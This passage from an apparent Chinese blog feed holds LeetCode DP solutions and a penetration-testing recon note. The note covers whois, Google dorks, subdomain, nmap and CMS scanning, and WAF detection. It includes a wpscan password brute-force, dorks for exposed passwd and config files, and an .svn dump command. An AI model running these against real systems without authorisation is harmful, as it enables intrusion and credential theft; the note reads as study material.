dp.<span class="built_in">push_back</span>(num);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                *it = num;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp.<span class="built_in">size</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">lengthOfLIS</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> nums: <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        n = <span class="built_in">len</span>(nums)</span><br><span class="line">        dp = [<span class="number">1</span>]*n</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,n):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i):</span><br><span class="line">                <span class="keyword">if</span> nums[j]&lt;nums[i]:</span><br><span class="line">                    dp[i] = <span class="built_in">max</span>(dp[i],dp[j]+<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">max</span>(dp)</span><br><span class="line"><span class="comment"># 优化：二分查找</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">lengthOfLIS</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> nums:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        </span><br><span class="line">        dp = []  <span class="comment"># 用于存储递增子序列</span></span><br><span class="line">        <span class="keyword">for</span> num <span class="keyword">in</span> nums:</span><br><span class="line">            <span class="comment"># 使用二分查找找到插入位置</span></span><br><span class="line">            pos = bisect.bisect_left(dp, num)</span><br><span class="line">            <span class="keyword">if</span> pos == <span class="built_in">len</span>(dp):</span><br><span class="line">                dp.append(num)  <span class="comment"># 如果 num 大于所有元素，直接添加到末尾</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dp[pos] = num  <span class="comment"># 否则替换掉第一个大于等于 num 的元素</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">len</span>(dp)  <span class="comment"># dp 的长度即为最长递增子序列的长度</span></span><br></pre></td></tr></table></figure>
<h2 id="72-编辑距离">72.编辑距离</h2>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minDistance</span><span class="params">(string word1, string word2)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n1 = word<span class="number">1.l</span>ength(), n2 = word<span class="number">2.l</span>ength();</span><br><span class="line">        <span class="keyword">if</span>(n1*n2==<span class="number">0</span>) <span class="keyword">return</span> n1+n2;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(n1<span class="number">+1</span>,<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n2<span class="number">+1</span>));</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n1<span class="number">+1</span>;i++) dp[i][<span class="number">0</span>] = i;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;n2<span class="number">+1</span>;j++) dp[<span class="number">0</span>][j] = j;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;n1<span class="number">+1</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;n2<span class="number">+1</span>;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(word1[i<span class="number">-1</span>]==word2[j<span class="number">-1</span>])</span><br><span class="line">                    dp[i][j]=dp[i<span class="number">-1</span>][j<span class="number">-1</span>];</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    dp[i][j]=<span class="number">1</span>+<span class="built_in">min</span>(&#123;dp[i<span class="number">-1</span>][j],dp[i][j<span class="number">-1</span>],dp[i<span class="number">-1</span>][j<span class="number">-1</span>]&#125;);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n1][n2];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">minDistance</span>(<span class="params">self, word1: <span class="built_in">str</span>, word2: <span class="built_in">str</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        n1, n2 = <span class="built_in">len</span>(word1), <span class="built_in">len</span>(word2)</span><br><span class="line">        <span class="keyword">if</span> n1*n2 == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> n1+n2</span><br><span class="line">        dp = [[<span class="number">0</span>]*(n2+<span class="number">1</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n1+<span class="number">1</span>)]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n1+<span class="number">1</span>):</span><br><span class="line">            dp[i][<span class="number">0</span>]=i</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n2+<span class="number">1</span>):</span><br><span class="line">            dp[<span class="number">0</span>][j]=j</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,n1+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,n2+<span class="number">1</span>):</span><br><span class="line">                <span class="keyword">if</span> word1[i-<span class="number">1</span>] == word2[j-<span class="number">1</span>]:</span><br><span class="line">                    dp[i][j] = dp [i-<span class="number">1</span>][j-<span class="number">1</span>]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    dp[i][j] = <span class="built_in">min</span>(dp[i-<span class="number">1</span>][j],dp[i][j-<span class="number">1</span>],dp[i-<span class="number">1</span>][j-<span class="number">1</span>])+<span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> dp[n1][n2]</span><br></pre></td></tr></table></figure>
<h2 id="198-打家劫舍">198.打家劫舍</h2>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">rob</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(nums.<span class="built_in">empty</span>()) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>(),dp0=<span class="number">0</span>,dp1=nums[<span class="number">0</span>],temp;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">            temp = <span class="built_in">max</span>(dp0,dp1);</span><br><span class="line">            dp1 = dp0 + nums[i];</span><br><span class="line">            dp0 = temp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">max</span>(dp0,dp1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">rob</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        n = <span class="built_in">len</span>(nums)</span><br><span class="line">        <span class="keyword">if</span> n ==<span class="number">0</span> :</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        dp = [[<span class="number">0</span>]*<span class="number">2</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">1</span>] = nums[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,n):</span><br><span class="line">            dp[i][<span class="number">0</span>] = <span class="built_in">max</span>(dp[i-<span class="number">1</span>][<span class="number">0</span>],dp[i-<span class="number">1</span>][<span class="number">1</span>])</span><br><span class="line">            dp[i][<span class="number">1</span>] = dp[i-<span class="number">1</span>][<span class="number">0</span>]+nums[i]</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">max</span>(dp[n-<span class="number">1</span>][<span class="number">0</span>],dp[n-<span class="number">1</span>][<span class="number">1</span>])</span><br></pre></td></tr></table></figure>
<h1>贪心算法</h1>
]]></content>
  </entry>
  <entry>
    <title>Git</title>
    <url>/2025/04/25/Git/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>渗透测试</title>
    <url>/2025/04/30/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">网络适配器-&gt;WLAN点下拉geng&#x27;d-&gt;共享</span><br><span class="line">clash verge: 打开系统代理和Tun 端口号7897</span><br><span class="line">ip: VMnet8的IPv4地址</span><br><span class="line">git 全局代理：</span><br><span class="line">	添加：git config --global http.proxy http://IP:7897</span><br><span class="line">		 git config --global https.proxy http://IP:7897</span><br><span class="line">	取消：git config --global --unset http.proxy</span><br><span class="line">		 git config --global --unset https.proxy</span><br><span class="line">	查看：git config --global -l</span><br></pre></td></tr></table></figure>
<h1>信息收集</h1>
<h2 id="需收集的信息：">需收集的信息：</h2>
<ul>
<li>域名信息(whois.、备案信息、子域名)</li>
<li>服务器信息（端口、服务、真实IP)</li>
<li>网站信息（网站架构、操作系统、中间件、数据库、编程语言、指纹信息、W八F、敏感目录、敏感文件、源码泄露、旁站、C段)</li>
<li>管理员信息（姓名、职务、生日、联系电话、邮件地址）</li>
</ul>
<h2 id="域名信息">域名信息</h2>
<h3 id="whois">whois</h3>
<h4 id="域名查询whois">域名查询whois</h4>
<p>根据已知域名反查,获取:注册人邮箱;注册人姓名;注册人手机;注册更新时间等信息</p>
<ul>
<li>
<p>脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd yjtools</span><br><span class="line">python whois_check.py</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>命令行</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whois [域名]</span><br></pre></td></tr></table></figure>
<ul>
<li>接口</li>
</ul>
<blockquote>
<p><a href="https://whois.aliyun.com/">https://whois.aliyun.com/</a><br>
<a href="https://www.whois365.com/cn/">https://www.whois365.com/cn/</a><br>
<a href="http://whois.chinaz.com/">http://whois.chinaz.com/</a></p>
</blockquote>
<h4 id="whois反查域名">whois反查域名</h4>
<p>根据已知域名WHOIS中的信息来反查其它与此信息相同的域名列表,但可能是代理商</p>
<ul>
<li>接口</li>
</ul>
<blockquote>
<p><a href="https://whois.chinaz.com/">https://whois.chinaz.com/</a>                              查询到的邮箱名前几位隐蔽</p>
<p><a href="https://whois.aizhan.com/reverse-whois/">https://whois.aizhan.com/reverse-whois/</a></p>
</blockquote>
<h3 id="备案号">备案号</h3>
<p>网页最下方通常有备案号,通过备案号查询该公司旗下其他域名或资产</p>
<ul>
<li>接口</li>
</ul>
<blockquote>
<p><a href="https://beian.miit.gov.cn/">https://beian.miit.gov.cn/</a></p>
<p><a href="https://icp.chinaz.com/">https://icp.chinaz.com/</a></p>
<p><a href="https://icp.chinaz.com/">https://icp.chinaz.com/</a></p>
</blockquote>
<h3 id="子域名">子域名</h3>
<h4 id="google-hacking">google hacking</h4>
<ul>
<li>语法</li>
</ul>
<table>
<thead>
<tr>
<th>字符</th>
<th>注释</th>
<th>例子</th>
<th>注释</th>
</tr>
</thead>
<tbody>
<tr>
<td>intext</td>
<td>寻找正文中含有关 键字的网页</td>
<td>intext：后台登录</td>
<td>将只返回正文中包含“后台登录”的网页</td>
</tr>
<tr>
<td>intitle</td>
<td>寻找标题中含有关 键字的网页</td>
<td>intitle：后台登录</td>
<td>将只返回标题中包含“后台 登录”的网页，intitle：后台登录密码将返回标题中 包含“后台登录而正文中包 含密码的网页</td>
</tr>
<tr>
<td>allinitle</td>
<td>用法和intitle类 似，只不过可以指 定多个词</td>
<td>alltitle：后台登录 管理员</td>
<td>将返回标题中包含“后台登录”和“管理员”的网页</td>
</tr>
<tr>
<td>inurl</td>
<td>将返回ur中含有关 键词的网页</td>
<td>inurl:Login</td>
<td>将返回ur1中含有Login 的网页</td>
</tr>
<tr>
<td>allinurl</td>
<td>用法和inurl类似， 只不过可以指定多 个词 n</td>
<td>allinurl:Login admin</td>
<td>将返回ur1中含有Login 和admin的网页</td>
</tr>
<tr>
<td>site</td>
<td>指定访问的站点</td>
<td>site:baidu.com inurl:Login</td>
<td>将只在baidu.com中查找 urI中含有Login的网页</td>
</tr>
<tr>
<td>filetype</td>
<td>指定访问的文件类 型</td>
<td>site:baidu.com filetype:pdf</td>
<td>将只返回baidu.com站点 上文件类型为pdf的网页</td>
</tr>
<tr>
<td>link</td>
<td>指定链接的网页</td>
<td>link:www.baidu.com</td>
<td>将返回所有包含指向 www.baidu.com的网页</td>
</tr>
<tr>
<td>related</td>
<td>相似类型的网页</td>
<td>related:www.xjtu.edu.cn</td>
<td>将返回与 www.xjtu.edu.cn相似的 页面，相似指的是网页的布局相似</td>
</tr>
<tr>
<td>info</td>
<td>返回站点的指定信 意</td>
<td>info:www.baidu.com corn</td>
<td>将返回百度的一些信息</td>
</tr>
<tr>
<td>define</td>
<td>返回某个词语的定 发</td>
<td>define:Hacker</td>
<td>将返回关于 Hacker的定义</td>
</tr>
<tr>
<td>cache</td>
<td>网页快照，谷歌将 返回给你它存储下 莱的房使货</td>
<td>cache:www.hackingspirits.com guest</td>
<td>将返回指定网站的缓存，并 且正文中含有guest</td>
</tr>
</tbody>
</table>
<ul>
<li>示例</li>
</ul>
<table>
<thead>
<tr>
<th>语法</th>
<th>注释</th>
</tr>
</thead>
<tbody>
<tr>
<td>inurl://admin/login.php</td>
<td>查找管理员登录页面</td>
</tr>
<tr>
<td>inurl:/phpmyadmin/index.php</td>
<td>查找后台数据库管理页面</td>
</tr>
<tr>
<td>site:baidu.com inurl:Login</td>
<td>只在baidu.com中查找url 中含有Login的网页</td>
</tr>
<tr>
<td>site:baidu.com filetype:pdf ed</td>
<td>只返回baidu.com站点上 文件类型为pdf的网页</td>
</tr>
<tr>
<td>link:www.baidu.com</td>
<td>返回所有包含指向 www.baidu.com的网页</td>
</tr>
<tr>
<td>related:www.1lhc.edu.cn</td>
<td>返回与 www.11hc.edu.cn网页 布局相似的页面</td>
</tr>
<tr>
<td>site:xx.comintext:管理site:xx.cominurl:login site:xx.comintitle:后台</td>
<td>查找网站后台</td>
</tr>
<tr>
<td>site:xx.com filetype:php site:xx.com filetype:asp site:xx.com filetype:jsp site:xx.com filetype:aspx</td>
<td>查看服务器使用的程序</td>
</tr>
<tr>
<td>site:xx.com inurl:file site:xx.com inurl:load</td>
<td>查看上传漏洞</td>
</tr>
</tbody>
</table>
<ul>
<li>Index of目录发现</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index of /admin</span><br><span class="line">index of /passwd</span><br><span class="line">index of /password</span><br><span class="line">index of /mail</span><br><span class="line">&quot;index of /&quot; +passwd</span><br><span class="line">&quot;index of /&quot; +password.txt</span><br><span class="line">&quot;index of /&quot; +.htaccess</span><br><span class="line">&quot;index of /root&quot;</span><br><span class="line">&quot;index of /cgi-bin&quot;</span><br><span class="line">&quot;index of /logs&quot;</span><br><span class="line">&quot;index of /config&quot;</span><br></pre></td></tr></table></figure>
<ul>
<li>子域名查询</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site:[域名]</span><br></pre></td></tr></table></figure>
<ul>
<li>接口查询</li>
</ul>
<blockquote>
<p><a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a><br>
<a href="https://www.dnsgrep.cn/">https://www.dnsgrep.cn/</a><br>
<a href="https://developers.virustotal.com/reference/domains-relationships">https://developers.virustotal.com/reference/domains-relationships</a><br>
<a href="http://tool.chinaz.com/subdomain">http://tool.chinaz.com/subdomain</a><br>
<a href="https://www.nmmapper.com/sys/tools/subdomainfinder/">https://www.nmmapper.com/sys/tools/subdomainfinder/</a></p>
</blockquote>
<h4 id="网络空间测绘工具">网络空间测绘工具</h4>
<table>
<thead>
<tr>
<th>工具名称</th>
<th>网址</th>
<th>语法</th>
</tr>
</thead>
<tbody>
<tr>
<td>FOFA</td>
<td><a href="https://fofa.info/">https://fofa.info/</a></td>
<td>domain=“[域名]”</td>
</tr>
<tr>
<td>鹰图</td>
<td><a href="https://hunter.qianxin.com/">https://hunter.qianxin.com/</a></td>
<td>domain=“[域名]”</td>
</tr>
<tr>
<td>钟馗之眼</td>
<td><a href="https://www.zoomeye.org/">https://www.zoomeye.org/</a></td>
<td>site:“[域名]”</td>
</tr>
<tr>
<td>shodan</td>
<td><a href="https://www.shodan.io/">https://www.shodan.io/</a></td>
<td>hostname:[域名]</td>
</tr>
</tbody>
</table>
<h4 id="SSL证书查询">SSL证书查询</h4>
<blockquote>
<p><a href="https://crt.sh/">https://crt.sh/</a></p>
<p><a href="https://developers.facebook.com/tools/ct/search/">https://developers.facebook.com/tools/ct/search/</a></p>
</blockquote>
<h4 id="JS文件发现">JS文件发现</h4>
<ul>
<li>
<p>脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd JSFinder</span><br><span class="line">python JSFinder.py -u http://[域名]</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="聚合工具">聚合工具</h4>
<p>OneForAll</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conda active py39\</span><br><span class="line">cd OneForAll/</span><br><span class="line">python oneforall.py --target [域名] run</span><br><span class="line">(谷歌联网)</span><br><span class="line">(查看 ./results/[域名].csv)</span><br></pre></td></tr></table></figure>
<h4 id="爆破">爆破</h4>
<p>子域名挖掘机(主机D://渗透)</p>
<h2 id="服务器信息">服务器信息</h2>
<h3 id="IP收集">IP收集</h3>
<h4 id="IP反查域名">IP反查域名</h4>
<blockquote>
<p><a href="http://stool.chinaz.com/same">http://stool.chinaz.com/same</a><br>
<a href="https://tools.ipip.net/ipdomain.php">https://tools.ipip.net/ipdomain.php</a><br>
<a href="https://www.dnsgrep.cn/">https://www.dnsgrep.cn/</a><br>
<a href="https://site.ip138.com/">https://site.ip138.com/</a></p>
</blockquote>
<h4 id="域名查IP">域名查IP</h4>
<p><a href="http://ip.tool.chinaz.com/">http://ip.tool.chinaz.com/</a><br>
<a href="https://ipchaxun.com/">https://ipchaxun.com/</a><br>
<a href="https://site.ip138.com/">https://site.ip138.com/</a></p>
<h4 id="C段存活主机探测">C段存活主机探测</h4>
<p>先旁注 后C段</p>
<p>查找与目标服务器P处于同一个C段的服务器IP</p>
<p>域名显示运营商是阿里云不是xxx机房之类，不用查</p>
<ul>
<li>nmap</li>
</ul>
<p>只能查出有没有开机</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sP www.example.com/24</span><br><span class="line">nmap -sP 192.168.1.*</span><br></pre></td></tr></table></figure>
<ul>
<li>脚本</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./TxPortMap -i www.example.com/24 -p 80</span><br></pre></td></tr></table></figure>
<h4 id="CDN">CDN</h4>
<p>多地ping</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://ping.chinaz.com/</span><br><span class="line">https://ping.aizhan.com/</span><br><span class="line">http://www.webkaka.com/Ping.aspx</span><br></pre></td></tr></table></figure>
<p>用各种多地ping的服务，查看对应P地址是否唯一</p>
<ul>
<li>国外访问</li>
</ul>
<blockquote>
<p><a href="https://ping.sx/ping">https://ping.sx/ping</a></p>
</blockquote>
<p>有些网站设置CDN可能没有把国外的访问包含进去，所以可以这么绕过</p>
<ul>
<li>
<p>查询子域名IP</p>
</li>
<li>
<p>MX记录邮件服务</p>
<p>​    MX记录是一种常见的查找IP的方式。如果网站在与wb相同的服务器和IP上托管自己的邮件服务器，那么原始服务器P将在MX记录中。</p>
</li>
<li>
<p>查询历史DNS记录</p>
</li>
</ul>
<blockquote>
<p><a href="https://viewdns.info/iphistory/">https://viewdns.info/iphistory/</a><br>
<a href="https://www.ip138.com/">https://www.ip138.com/</a></p>
</blockquote>
<p>真实ip可能是买DNS的前一个</p>
<h3 id="端口收集">端口收集</h3>
<p>一个电脑最多65525个端口,常见端口总结</p>
<blockquote>
<p><a href="https://edu.yijinglab.com/post/280">https://edu.yijinglab.com/post/280</a></p>
</blockquote>
<ul>
<li>nmap</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -A -T4 192.168.1.1</span><br><span class="line"></span><br><span class="line">A：全面扫描\综合扫描</span><br><span class="line">T4：扫描速度，共有6级，T0-T5</span><br><span class="line"></span><br><span class="line">不加端口则扫描默认端口，1-1024 + nmap-service</span><br><span class="line"></span><br><span class="line">单一主机扫描：</span><br><span class="line">nmap 192.168.1.2</span><br><span class="line"></span><br><span class="line">子网扫描：</span><br><span class="line">nmap 192.168.1.1/24</span><br><span class="line"></span><br><span class="line">多主机扫描：</span><br><span class="line">nmap 192.168.1.1 192.168.1.10</span><br><span class="line"></span><br><span class="line">主机范围扫描：</span><br><span class="line">nmap 192.168.1.1-100</span><br><span class="line"></span><br><span class="line">IP地址列表扫描：</span><br><span class="line">nmap –iL target.txt</span><br><span class="line"></span><br><span class="line">扫描除指定IP外的所有子网主机：</span><br><span class="line">nmap 192.168.1.1/24 --exclude 192.168.1.1</span><br><span class="line"></span><br><span class="line">扫描除文件中IP外的子网主机：</span><br><span class="line">nmap 192.168.1.1/24 --excludefile xxx.txt</span><br><span class="line"></span><br><span class="line">扫描特定主机上的80,21,23端口：</span><br><span class="line">nmap –p 80,21,23 192.168.1.1</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS -v -T4 -Pn -p 0-65535 -oN FullTCP -iL liveHosts.txt</span><br><span class="line"></span><br><span class="line">-sS：SYN扫描,又称为半开放扫描，它不打开一个完全的TCP连接，执行得很快，效率高（一个完整的tcp连接需要3次握手，而-sS选项不需要3次握手）</span><br><span class="line"></span><br><span class="line">优点：Nmap发送SYN包到远程主机，但是它不会产生任何会话，目标主机几乎不会把连接记入系统日志。（防止对方判断为扫描攻击），扫描速度快，效率高，在工作中使用频率最高</span><br><span class="line">缺点：它需要root/administrator权限执行</span><br><span class="line"></span><br><span class="line">-Pn：扫描之前不需要用ping命令，有些防火墙禁止ping命令。可以使用此选项进行扫描</span><br><span class="line"></span><br><span class="line">-iL：导入需要扫描的列表</span><br></pre></td></tr></table></figure>
<h3 id="网站信息">网站信息</h3>
<h4 id="操作系统">操作系统</h4>
<ul>
<li>ping判断：windows的TTL值一般为128，Linux则为64。<br>
TTL大于100的一般为windows,几十的一般为linux。</li>
<li>nmap -o [ip/域名]</li>
<li>windows大小写不敏感，1inux则区分大小写</li>
</ul>
<h4 id="网站服务、容器类型">网站服务、容器类型</h4>
<ul>
<li>F12查看响应头Server字段</li>
<li>whatweb</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whateweb -v -a 3 [ip]</span><br></pre></td></tr></table></figure>
<ul>
<li>wappalyzer插件</li>
</ul>
<p>apache,nginx,tomcat,IIS<br>
通过容器类型、版本可考虑对应容器存在的漏洞（解析漏洞）</p>
<h4 id="脚本类型">脚本类型</h4>
<blockquote>
<p>1.php<br>
2.jsp<br>
3.asp/aspx<br>
4.python</p>
</blockquote>
<p>知道是什么语言才可以针对性的进行文件扫描、文件上传</p>
<h4 id="数据库类型">数据库类型</h4>
<blockquote>
<p><a href="https://edu.yijinglab.com/post/298">https://edu.yijinglab.com/post/298</a></p>
</blockquote>
<h4 id="CMS识别">CMS识别</h4>
<p>内容管理系统，用于网站内容文章管理。常见CMS:WordPress、Joomla、.Drupal、dedecms(织梦)、Discuz、phpcms等。</p>
<ul>
<li>CMS检测识别工具</li>
</ul>
<p>CMSeeK:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd CMSeek</span><br><span class="line">python TPscan.py</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
<p>joomscan识别Joomla：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">joomscan -u http://192.168.233.187/</span><br></pre></td></tr></table></figure>
<p>wpscan识别WordPress：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、刺探基础信息：</span><br><span class="line">wpscan --url http://www.example.com</span><br><span class="line"></span><br><span class="line">2、猜解后台用户名</span><br><span class="line">wpscan --url http://www.example.com --enumerate u</span><br><span class="line"></span><br><span class="line">3、使用字典暴破用户名admin的密码</span><br><span class="line">wpscan --url http://www.example.com -P password.txt -U admin </span><br><span class="line"></span><br><span class="line">4、扫描插件</span><br><span class="line">wpscan --url http://www.example.com --enumerate p</span><br><span class="line"></span><br><span class="line">5、扫描易受攻击的插件</span><br><span class="line">wpscan --url http://www.example.com --enumerate vp</span><br><span class="line"></span><br><span class="line">6、扫描所有插件</span><br><span class="line">wpscan --url http://www.example.com --enumerate ap</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>TPscan识别thinkphp：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd TPscan</span><br><span class="line">python TPscan.py</span><br></pre></td></tr></table></figure>
<h4 id="敏感文件">敏感文件</h4>
<ul>
<li>.git泄漏</li>
</ul>
<blockquote>
<p>若存在.git泄漏，打开githack网站 <a href="https://githack.com/">https://githack.com/</a></p>
<p>在网站上方的文本框中输入目标Git存储库的URL，例如<code>https://example.com/.git/</code></p>
<p>点击<code>Generate link</code>按钮生成可下载存储库的链接。</p>
<p>将生成的链接复制到浏览器地址栏中并打开。</p>
<p>从打开的页面中下载压缩的Git存储库文件。</p>
</blockquote>
<ul>
<li>.svn泄漏</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd SvnExploit</span><br><span class="line">python SvnExploit.py -u http://192.168.27.128/.svn</span><br><span class="line"># 下载</span><br><span class="line">python SvnExploit.py -u http://192.168.27.128/.svn --dump</span><br></pre></td></tr></table></figure>
<ul>
<li>目录扫描</li>
</ul>
<blockquote>
<p>dirsearch -u [url]</p>
<p>dir [url] /usr/share/wordlists/dirb/common.txt</p>
<p>7kbscan(windows)</p>
</blockquote>
<h4 id="waf">waf</h4>
<ul>
<li>wafw00f</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wafw00f [url]</span><br></pre></td></tr></table></figure>
<ul>
<li>nmap</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap –p80,443 --script http-waf-detect ip</span><br><span class="line"></span><br><span class="line">nmap –p80,443 --script http-waf-fingerprint ip</span><br></pre></td></tr></table></figure>
<h3 id="自动化集成工具">自动化集成工具</h3>
<ul>
<li>灯塔</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd LinuxEnvConfig</span><br><span class="line"></span><br><span class="line">sudo bash LinuxEnvConfig.sh</span><br><span class="line"></span><br><span class="line">8</span><br><span class="line">docker0的inet</span><br></pre></td></tr></table></figure>
<ul>
<li>EHole</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd D:\渗透\EHole\EHole_windows_amd64</span><br><span class="line">EHole_windows_amd64.exe -h</span><br><span class="line"></span><br><span class="line"># URL地址需带上协议,每行一个</span><br><span class="line">EHole_windows_amd64.exe finger -l url.txt</span><br><span class="line"># 支持单IP或IP段</span><br><span class="line">EHole_windows_amd64.exe finger -f 192.168.1.1/24</span><br><span class="line"># 结果输出至export.json文件</span><br><span class="line">EHole_windows_amd64.exe finger -l url.txt -json export.json</span><br></pre></td></tr></table></figure>
<h1>漏洞挖掘</h1>
<h2 id="SQL注入">SQL注入</h2>
<h3 id="基础语法">基础语法</h3>
